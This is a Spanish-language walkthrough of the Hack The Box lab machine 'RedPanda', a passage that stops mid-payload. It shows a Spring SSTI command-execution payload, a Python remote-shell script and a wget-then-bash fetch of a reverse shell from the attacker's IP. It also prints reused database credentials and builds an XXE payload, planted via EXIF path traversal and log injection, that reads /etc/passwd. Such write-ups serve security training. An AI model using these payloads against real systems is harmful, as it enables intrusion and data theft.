\u0026ldquo;Made with Spring Boot\u0026rdquo;, por lo que quizas esté utilizando el Framework en Java Spring.\n1 2 3 4 5 6 7 8 π ~/htb/redpanda ❯ curl -sI 10.10.11.170:8080 HTTP/1.1 200 Content-Type: text/html;charset=UTF-8 Content-Language: en-US Content-Length: 1543 Date: Sat, 16 Jul 2022 23:14:59 GMT π ~/htb/redpanda ❯ El sitio unicamente muestra un formulario de busqueda.\nTras realizar una pequeña busqueda observamos, pandas, y un enlace del autor.\nObservamos imagenes del autor y el numero de visitas por imagen.\nTras presionar \u0026ldquo;Export Table\u0026rdquo; se descarga un archivo xml, con la información que se muestra en la página por autor.\nLa página de autor unicamente acepta los nombres de woodenk y damian.\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;credits\u0026gt; \u0026lt;author\u0026gt;woodenk\u0026lt;/author\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/greg.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;1\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/hungy.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/smooch.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;1\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/smiley.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;totalviews\u0026gt;2\u0026lt;/totalviews\u0026gt; \u0026lt;/credits\u0026gt; Directory Brute Forcing feroxbuster nos muestra las direcciones de páginas que encontramos en el sitio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 π ~/htb/redpanda ❯ feroxbuster -u http://10.10.11.170:8080/ --depth 1 -x php,html,xml ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.7.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.170:8080/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, html, xml] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 55l 119w 0c http://10.10.11.170:8080/ 200 GET 32l 97w 0c http://10.10.11.170:8080/stats 405 GET 1l 3w 0c http://10.10.11.170:8080/search 500 GET 1l 1w 0c http://10.10.11.170:8080/error 200 GET 2l 4w 38c http://10.10.11.170:8080/export.xml SSTI - Java Al considerar la tecnologia como Spring intentamos identificar alguna vulnerabilidad SSTI con los payloads que se mencionan en hacktricks utilizando Intruder de BurpSuite. Observamos que se muestra el resultado de #{7*7}.\nAdemás descubrimos que el caracter $ no es aceptado. Sin embargo la mayoria de payloads (1, 2) utilizan el simbolo $.\nUn post de Thymeleaf (un motor de plantillas en java) presenta distintos tipos de expresiones. Observando la documentacion nos topamos con distintos ejemplos.\n1 2 3 4 5 ${...}: Variable expressions – in practice, these are OGNL or Spring EL expressions. *{...}: Selection expressions – similar to variable expressions but used for specific purposes. #{...}: Message (i18n) expressions – used for internationalization. @{...}: Link (URL) expressions – used to set correct URLs/paths in the application. ~{...}: Fragment expressions – they let you reuse parts of templates. Nuevamente, utilizando estas expresiones para intentar realizar una operación matematica. Eliminando el caracter $ que, como sabemos no es aceptado.\n1 2 3 4 *{7*7} #{7*7} @{7*7} ~{7*7} Tanto el caracter * y @ son aceptados y muestran el resultado de la operación. Además encontramos que el caracter ~ no es aceptado.\nUtilizando el caracter * logramos obtener las variables de la máquina.\n1 *{T(java.lang.System).getenv()} Utilizando un payload de java para ejecutar comandos observamos el resultado en el sitio.\n1 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\u0026#39;id\u0026#39;).getInputStream())} User - Woodenk Creamos un pequeño script en python para poder ejecutar comandos en la máquina utilizando el payload anterior.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/usr/bin/env python3 import requests import readline from bs4 import BeautifulSoup URL = \u0026#34;http://10.10.11.170:8080/search\u0026#34; headers = {\u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded; charset=UTF-8\u0026#34;} try: while True: cmd = input(\u0026#34;$\u0026gt; \u0026#34;) payload = \u0026#39;name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\u0026#34;\u0026#39; + cmd + \u0026#39;\u0026#34;).getInputStream())}\u0026#39; r = requests.post(URL, data = payload, headers = headers) soup = BeautifulSoup(r.text, \u0026#39;lxml\u0026#39;) search = soup.find_all(\u0026#34;h2\u0026#34;, {\u0026#39;class\u0026#39;:\u0026#39;searched\u0026#39;})[0].get_text()[17:] print(search) except KeyboardInterrupt: print(\u0026#39;\\nCtrl+C\u0026#39;) exit(0) LogParser Enumerando los directorios encontramos el codigo fuente de LogParser en /opt, sin embargo no encontramos algun proceso que este relacionado a esta aplicación.\nbash\rApp.java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $\u0026gt; ls -lah /opt/credit-score/LogParser/final/src/main/java/com/logparser total 12K drwxrwxr-x 2 root root 4.0K Jun 20 16:29 . drwxrwxr-x 3 root root 4.0K Jun 14 14:35 .. -rw-rw-r-- 1 root root 3.7K Jun 20 15:43 App.java $\u0026gt; cat /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java package com.logparser; import java.io.BufferedWriter; [.. snip ..] public class App { [.. PESTAÑA 2 ..] } $\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 package com.logparser; import java.io.BufferedWriter; import java.io.File; import java.io.FileWriter; import java.io.IOException; import java.util.HashMap; import java.util.Map; import java.util.Scanner; import com.drew.imaging.jpeg.JpegMetadataReader; import com.drew.imaging.jpeg.JpegProcessingException; import com.drew.metadata.Directory; import com.drew.metadata.Metadata; import com.drew.metadata.Tag; import org.jdom2.JDOMException; import org.jdom2.input.SAXBuilder; import org.jdom2.output.Format; import org.jdom2.output.XMLOutputter; import org.jdom2.*; public class App { public static Map parseLog(String line) { String[] strings = line.split(\u0026#34;\\\\|\\\\|\u0026#34;); Map map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;status_code\u0026#34;, Integer.parseInt(strings[0])); map.put(\u0026#34;ip\u0026#34;, strings[1]); map.put(\u0026#34;user_agent\u0026#34;, strings[2]); map.put(\u0026#34;uri\u0026#34;, strings[3]); return map; } public static boolean isImage(String filename){ if(filename.contains(\u0026#34;.jpg\u0026#34;)) { return true; } return false; } public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = \u0026#34;/opt/panda_search/src/main/resources/static\u0026#34; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == \u0026#34;Artist\u0026#34;) { return tag.getDescription(); } } } return \u0026#34;N/A\u0026#34;; } public static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for(Element el: rootElement.getChildren()) { if(el.getName() == \u0026#34;image\u0026#34;) { if(el.getChild(\u0026#34;uri\u0026#34;).getText().equals(uri)) { Integer totalviews = Integer.parseInt(rootElement.getChild(\u0026#34;totalviews\u0026#34;).getText()) + 1; System.out.println(\u0026#34;Total views:\u0026#34; + Integer.toString(totalviews)); rootElement.getChild(\u0026#34;totalviews\u0026#34;).setText(Integer.toString(totalviews)); Integer views = Integer.parseInt(el.getChild(\u0026#34;views\u0026#34;).getText()); el.getChild(\u0026#34;views\u0026#34;).setText(Integer.toString(views + 1)); } } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(\u0026#34;/opt/panda_search/redpanda.log\u0026#34;); Scanner log_reader = new Scanner(log_fd); while(log_reader.hasNextLine()) { String line = log_reader.nextLine(); if(!isImage(line)) { continue; } Map parsed_data = parseLog(line); System.out.println(parsed_data.get(\u0026#34;uri\u0026#34;)); String artist = getArtist(parsed_data.get(\u0026#34;uri\u0026#34;).toString()); System.out.println(\u0026#34;Artist: \u0026#34; + artist); String xmlPath = \u0026#34;/credits/\u0026#34; + artist + \u0026#34;_creds.xml\u0026#34;; addViewTo(xmlPath, parsed_data.get(\u0026#34;uri\u0026#34;).toString()); } } } Shell Descubrimos que los caracteres * y _ no son aceptados por nuestro payload por alguna razon. Por lo que ejecutamos shells, ejecutando netcat y la shell inversa en la máquina.\n1 2 3 $\u0026gt; wget 10.10.14.207:8080/10.10.14.207:1335 -O /tmp/shell $\u0026gt; bash /tmp/shell Con ello obtuvimos una shell como woodenk y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/redpanda ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from 10.10.11.170 [10.10.11.170] 57860 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; woodenk@redpanda:/tmp/hsperfdata_woodenk$ whoami;id woodenk uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd woodenk@redpanda:~$ ls user.txt woodenk@redpanda:~$ cat user.txt b2d88c9c27ab73dc1aa6c465e779919a woodenk@redpanda:~$ Shell SSH En el directorio /opt/panda_search encontramos el codigo fuente (Pestaña 2) de la aplicación web, en esta observamos las credenciales de la base de datos MySQL.\nconexión\rMainController.java\r1 conn = DriverManager.getConnection(\u0026#34;jdbc:mysql://localhost:3306/red_panda\u0026#34;, \u0026#34;woodenk\u0026#34;, \u0026#34;RedPandazRule\u0026#34;); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 \u0026lt;h/src/main/java/com/panda_search/htb/panda_search$ ls MainController.java PandaSearchApplication.java RequestInterceptor.java \u0026lt;h/src/main/java/com/panda_search/htb/panda_search$ \u0026lt;h/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java package com.panda_search.htb.panda_search; import java.util.ArrayList; import java.io.IOException; import java.sql.*; import java.util.List; import java.util.ArrayList; import java.io.File; import java.io.InputStream; import java.io.FileInputStream; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.servlet.ModelAndView; import org.springframework.http.MediaType; import org.apache.commons.io.IOUtils; import org.jdom2.JDOMException; import org.jdom2.input.SAXBuilder; import org.jdom2.output.Format; import org.jdom2.output.XMLOutputter; import org.jdom2.*; @Controller public class MainController { @GetMapping(\u0026#34;/stats\u0026#34;) public ModelAndView stats(@RequestParam(name=\u0026#34;author\u0026#34;,required=false) String author, Model model) throws JDOMException, IOException{ SAXBuilder saxBuilder = new SAXBuilder(); if(author == null) author = \u0026#34;N/A\u0026#34;; author = author.strip(); System.out.println(\u0026#39;\u0026#34;\u0026#39; + author + \u0026#39;\u0026#34;\u0026#39;); if(author.equals(\u0026#34;woodenk\u0026#34;) || author.equals(\u0026#34;damian\u0026#34;)) { String path = \u0026#34;/credits/\u0026#34; + author + \u0026#34;_creds.xml\u0026#34;; File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); String totalviews = rootElement.getChildText(\u0026#34;totalviews\u0026#34;); List\u0026lt;Element\u0026gt; images = rootElement.getChildren(\u0026#34;image\u0026#34;); for(Element image: images) System.out.println(image.getChildText(\u0026#34;uri\u0026#34;)); model.addAttribute(\u0026#34;noAuthor\u0026#34;, false); model.addAttribute(\u0026#34;author\u0026#34;, author); model.addAttribute(\u0026#34;totalviews\u0026#34;, totalviews); model.addAttribute(\u0026#34;images\u0026#34;, images); return new ModelAndView(\u0026#34;stats.html\u0026#34;); } else { model.addAttribute(\u0026#34;noAuthor\u0026#34;, true); return new ModelAndView(\u0026#34;stats.html\u0026#34;); } } @GetMapping(value=\u0026#34;/export.xml\u0026#34;, produces = MediaType.APPLICATION_OCTET_STREAM_VALUE) public @ResponseBody byte[] exportXML(@RequestParam(name=\u0026#34;author\u0026#34;, defaultValue=\u0026#34;err\u0026#34;) String author) throws IOException { System.out.println(\u0026#34;Exporting xml of: \u0026#34; + author); if(author.equals(\u0026#34;woodenk\u0026#34;) || author.equals(\u0026#34;damian\u0026#34;)) { InputStream in = new FileInputStream(\u0026#34;/credits/\u0026#34; + author + \u0026#34;_creds.xml\u0026#34;); System.out.println(in); return IOUtils.toByteArray(in); } else { return IOUtils.toByteArray(\u0026#34;Error, incorrect paramenter \u0026#39;author\u0026#39;\\n\\r\u0026#34;); } } @PostMapping(\u0026#34;/search\u0026#34;) public ModelAndView search(@RequestParam(\u0026#34;name\u0026#34;) String name, Model model) { if(name.isEmpty()) { name = \u0026#34;Greg\u0026#34;; } String query = filter(name); ArrayList pandas = searchPanda(query); System.out.println(\u0026#34;\\n\\\u0026#34;\u0026#34;+query+\u0026#34;\\\u0026#34;\\n\u0026#34;); model.addAttribute(\u0026#34;query\u0026#34;, query); model.addAttribute(\u0026#34;pandas\u0026#34;, pandas); model.addAttribute(\u0026#34;n\u0026#34;, pandas.size()); return new ModelAndView(\u0026#34;search.html\u0026#34;); } public String filter(String arg) { String[] no_no_words = {\u0026#34;%\u0026#34;, \u0026#34;_\u0026#34;,\u0026#34;$\u0026#34;, \u0026#34;~\u0026#34;, }; for (String word : no_no_words) { if(arg.contains(word)){ return \u0026#34;Error occured: banned characters\u0026#34;; } } return arg; } public ArrayList searchPanda(String query) { Connection conn = null; PreparedStatement stmt = null; ArrayList\u0026lt;ArrayList\u0026gt; pandas = new ArrayList(); try { Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); conn = DriverManager.getConnection(\u0026#34;jdbc:mysql://localhost:3306/red_panda\u0026#34;, \u0026#34;woodenk\u0026#34;, \u0026#34;RedPandazRule\u0026#34;); stmt = conn.prepareStatement(\u0026#34;SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?\u0026#34;); stmt.setString(1, \u0026#34;%\u0026#34; + query + \u0026#34;%\u0026#34;); ResultSet rs = stmt.executeQuery(); while(rs.next()){ ArrayList\u0026lt;String\u0026gt; panda = new ArrayList\u0026lt;String\u0026gt;(); panda.add(rs.getString(\u0026#34;name\u0026#34;)); panda.add(rs.getString(\u0026#34;bio\u0026#34;)); panda.add(rs.getString(\u0026#34;imgloc\u0026#34;)); panda.add(rs.getString(\u0026#34;author\u0026#34;)); pandas.add(panda); } }catch(Exception e){ System.out.println(e);} return pandas; } } \u0026lt;h/src/main/java/com/panda_search/htb/panda_search$ Utilizando estas credenciales logramos acceder por SSH. Algo muy interesante de mencionar es que, en SSH no tenemos asignado el grupo logs, a diferencia de nuestra shell inversa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/redpanda ❯ ssh woodenk@10.10.11.170 # RedPandazRule woodenk@10.10.11.170\u0026#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 18 Jul 2022 05:28:32 AM UTC System load: 0.08 Processes: 222 Usage of /: 80.5% of 4.30GB Users logged in: 0 Memory usage: 41% IPv4 address for eth0: 10.10.11.170 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Tue Jul 5 05:51:25 2022 from 10.10.14.23 woodenk@redpanda:~$ whoami;id woodenk uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk) woodenk@redpanda:~$ Si observamos los procesos, root ejecuta la aplicación web asignando el grupo logs a este proceso, por tal razon solo en la shell inversa se asigna este grupo.\n1 2 3 4 5 woodenk@redpanda:~$ ps -ef | grep logs root 884 880 0 02:54 ? 00:00:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar root 885 884 0 02:54 ? 00:00:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar woodenk 3552 3500 0 05:30 pts/3 00:00:00 grep --color=auto logs woodenk@redpanda:~$ Se muestran los directorios y archivos a los cuales el grupo logs tiene acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 woodenk@redpanda:~$ find / -group logs 2\u0026gt;/dev/null | grep -v home | grep -v proc /opt/panda_search/redpanda.log /tmp/tomcat-docbase.8080.15111930775947992796 /tmp/hsperfdata_woodenk /tmp/hsperfdata_woodenk/901 /tmp/shell /tmp/tomcat.8080.3144393524989236446 /tmp/tomcat.8080.3144393524989236446/work /tmp/tomcat.8080.3144393524989236446/work/Tomcat /tmp/tomcat.8080.3144393524989236446/work/Tomcat/localhost /tmp/tomcat.8080.3144393524989236446/work/Tomcat/localhost/ROOT /credits woodenk@redpanda:~$ Privesc Ejecutamos pspy, encontramos dos cronjobs, uno realiza la limpieza de imagenes y archivos xml, otro ejecuta un archivo .jar.\n1 2 3 4 5 6 7 8 9 2022/07/18 05:50:01 CMD: UID=1000 PID=3837 | /bin/bash /opt/cleanup.sh 2022/07/18 05:50:01 CMD: UID=1000 PID=3848 | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; 2022/07/18 05:50:01 CMD: UID=1000 PID=3849 | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 2022/07/18 05:50:01 CMD: UID=1000 PID=3850 | /usr/bin/find /dev/shm -name *.jpg -exec rm -rf {} ; 2022/07/18 05:50:01 CMD: UID=1000 PID=3851 | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 2022/07/18 05:52:01 CMD: UID=0 PID=3854 | /usr/sbin/CRON -f 2022/07/18 05:52:01 CMD: UID=0 PID=3855 | /bin/sh -c /root/run_credits.sh 2022/07/18 05:52:01 CMD: UID=0 PID=3856 | /bin/sh /root/run_credits.sh 2022/07/18 05:52:01 CMD: UID=0 PID=3857 | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar XXE LogParser En el directorio del .jar vemos el codigo que ya habiamos encontrado anteriormente: App.java.\nApp.java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 public class App { public static Map parseLog(String line) { String[] strings = line.split(\u0026#34;\\\\|\\\\|\u0026#34;); Map map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;status_code\u0026#34;, Integer.parseInt(strings[0])); map.put(\u0026#34;ip\u0026#34;, strings[1]); map.put(\u0026#34;user_agent\u0026#34;, strings[2]); map.put(\u0026#34;uri\u0026#34;, strings[3]); return map; } public static boolean isImage(String filename){ if(filename.contains(\u0026#34;.jpg\u0026#34;)) { return true; } return false; } public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = \u0026#34;/opt/panda_search/src/main/resources/static\u0026#34; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == \u0026#34;Artist\u0026#34;) { return tag.getDescription(); } } } return \u0026#34;N/A\u0026#34;; } public static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for(Element el: rootElement.getChildren()) { if(el.getName() == \u0026#34;image\u0026#34;) { if(el.getChild(\u0026#34;uri\u0026#34;).getText().equals(uri)) { Integer totalviews = Integer.parseInt(rootElement.getChild(\u0026#34;totalviews\u0026#34;).getText()) + 1; System.out.println(\u0026#34;Total views:\u0026#34; + Integer.toString(totalviews)); rootElement.getChild(\u0026#34;totalviews\u0026#34;).setText(Integer.toString(totalviews)); Integer views = Integer.parseInt(el.getChild(\u0026#34;views\u0026#34;).getText()); el.getChild(\u0026#34;views\u0026#34;).setText(Integer.toString(views + 1)); } } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(\u0026#34;/opt/panda_search/redpanda.log\u0026#34;); Scanner log_reader = new Scanner(log_fd); while(log_reader.hasNextLine()) { String line = log_reader.nextLine(); if(!isImage(line)) { continue; } Map parsed_data = parseLog(line); System.out.println(parsed_data.get(\u0026#34;uri\u0026#34;)); String artist = getArtist(parsed_data.get(\u0026#34;uri\u0026#34;).toString()); System.out.println(\u0026#34;Artist: \u0026#34; + artist); String xmlPath = \u0026#34;/credits/\u0026#34; + artist + \u0026#34;_creds.xml\u0026#34;; addViewTo(xmlPath, parsed_data.get(\u0026#34;uri\u0026#34;).toString()); } } } El programa inicia obteniendo información del archivo redpanda.log (parseLog()), archivo que contiene las solicitudes hechas a la aplicación web, unicamente obtiene el path del archivo. Si el archivo obtenido es una imagen (isImage()), obtiene el tag \u0026ldquo;Artist\u0026rdquo; de los metadatos de la imagen (getArtist()), utiliza este ultimo para crear un path y nombre de un archivo xml (/credits/\u0026lt;artist\u0026gt;_creds.xml). Finalmente utiliza la funcion addViewTo() con el path del archivo xml y el path de la imagen.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(\u0026#34;/opt/panda_search/redpanda.log\u0026#34;); Scanner log_reader = new Scanner(log_fd); while(log_reader.hasNextLine()) { String line = log_reader.nextLine(); if(!isImage(line)) { continue; } Map parsed_data = parseLog(line); System.out.println(parsed_data.get(\u0026#34;uri\u0026#34;)); String artist = getArtist(parsed_data.get(\u0026#34;uri\u0026#34;).toString()); System.out.println(\u0026#34;Artist: \u0026#34; + artist); String xmlPath = \u0026#34;/credits/\u0026#34; + artist + \u0026#34;_creds.xml\u0026#34;; addViewTo(xmlPath, parsed_data.get(\u0026#34;uri\u0026#34;).toString()); } } addViewTo() obtiene el total de vistas información que se muestra en el Export Table del sitio, utiliza SAXBuilder una libreria que permite manejar archivos XML, OWASP menciona como prevenir XXE, sin embargo en el codigo no es aplicado, por lo que al realizar la lectura del archivo se podría explotar esta vulnerabilidad y el resultado se vería reflejado en el mismo archivo XML (xmlOutput.output()).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for(Element el: rootElement.getChildren()){ if(el.getName() == \u0026#34;image\u0026#34;){ if(el.getChild(\u0026#34;uri\u0026#34;).getText().equals(uri)){ Integer totalviews = Integer.parseInt(rootElement.getChild(\u0026#34;totalviews\u0026#34;).getText()) + 1; System.out.println(\u0026#34;Total views:\u0026#34; + Integer.toString(totalviews)); rootElement.getChild(\u0026#34;totalviews\u0026#34;).setText(Integer.toString(totalviews)); Integer views = Integer.parseInt(el.getChild(\u0026#34;views\u0026#34;).getText()); el.getChild(\u0026#34;views\u0026#34;).setText(Integer.toString(views + 1)); } } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } Exploit XXE Tag Artist - Imagen Para explotar esta vulnerabilidad primero, debemos de modificar el tag Artist de los metadatos de una imagen, ya que es donde se obtiene el nombre del artista para el archivo xml a crear (\u0026quot;/credits/\u0026quot; + artist + \u0026quot;_creds.xml\u0026quot;), aunque en el directorio donde se crean los archivos xml no es posible modificar o crear alguno.\n1 2 3 4 5 6 7 8 9 10 11 12 woodenk@redpanda:/credits$ id uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) woodenk@redpanda:/credits$ woodenk@redpanda:/credits$ ls -lah total 16K drw-r-x--- 2 root logs 4.0K Jun 21 12:32 . drwxr-xr-x 20 root root 4.0K Jun 23 14:52 .. -rw-r----- 1 root logs 422 Jul 18 21:42 damian_creds.xml -rw-r----- 1 root logs 426 Jul 18 21:38 woodenk_creds.xml woodenk@redpanda:/credits$ touch file.xml touch: cannot touch \u0026#39;file.xml\u0026#39;: Permission denied woodenk@redpanda:/credits$ Es por ello que utilizamos ../ para modificar el path del archivo. En este caso crearía el archivo xml /home/woodenk/file_creds.xml.\n1 2 3 4 5 6 π ~/htb/redpanda/www ❯ exiftool -Artist=\u0026#34;../home/woodenk/file\u0026#34; greg.jpg Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - greg.jpg 1 image files updated π ~/htb/redpanda/www ❯ exiftool greg.jpg|grep Artist Artist : ../home/woodenk/file π ~/htb/redpanda/www ❯ Finalmente se movemos esta imagen al directorio de woodenk, /home/woodenk/greg.jpg.\nArchivo Log Modificamos el archivo redpanda.log, esto lo hacemos mediante la reverse shell del sitio web ya que para modificar este archivo necesitamos pertenecer al grupo logs o ser usuario root. Sin embargo el path para las imagenes ya está definido y la mayoria de estas tienen un path /img/\u0026lt;nombre\u0026gt;.jpg por lo que el path completo sería /opt/panda_search/src/main/resources/static/img/\u0026lt;nombr\u0026gt;.jpg y el unico con acceso a este directorio es el usuario root.\n1 String fullpath = \u0026#34;/opt/panda_search/src/main/resources/static\u0026#34; + uri; De la misma forma que en la imagen \u0026ldquo;subimos\u0026rdquo; varios directorios con ../ hasta la raiz y escribimos el path completo de nuestra imagen, agregamos el path de la imagen que modificamos anteriormente.\n1 200||127.0.0.1||User-Agent sckull 13.37 ||/../../../../../../home/woodenk/greg.jpg Finalmente lo añadimos al archivo log.\n1 2 3 4 5 6 7 woodenk@redpanda:~$ echo \u0026#34;200||127.0.0.1||User-Agent sckull 13.37 ||/../../../../../../home/woodenk/greg.jpg\u0026#34; \u0026gt;\u0026gt; /opt/panda_search/redpanda.log \u0026lt;woodenk/greg.jpg\u0026#34; \u0026gt;\u0026gt; /opt/panda_search/redpanda.log woodenk@redpanda:~$ tail /opt/panda_search/redpanda.log [.. snip ..] 200||10.10.16.21||python-requests/2.27.1||/search 200||127.0.0.1||User-Agent sckull 13.37 ||/../../../../../../home/woodenk/greg.jpg woodenk@redpanda:~$ Archivo XML Con esto solo faltaría crear el archivo /home/woodenk/file_creds.xml, en este agregamos un payload de XXE para la lectura del archivo /etc/passwd.\n1 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE root [\u0026lt;!ENTITY test SYSTEM \u0026#39;file:///etc/passwd\u0026#39;\u0026gt;]\u0026gt;\u0026lt;root\u0026gt;\u0026amp;test;\u0026lt;/root\u0026gt; Con ello tendríamos lo necesario para explotar XXE.\n1 2 3 4 5 woodenk@redpanda:~$ ls file_creds.xml greg.jpg user.txt woodenk@redpanda:~$ cat file_creds.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE root [\u0026lt;!ENTITY test SYSTEM 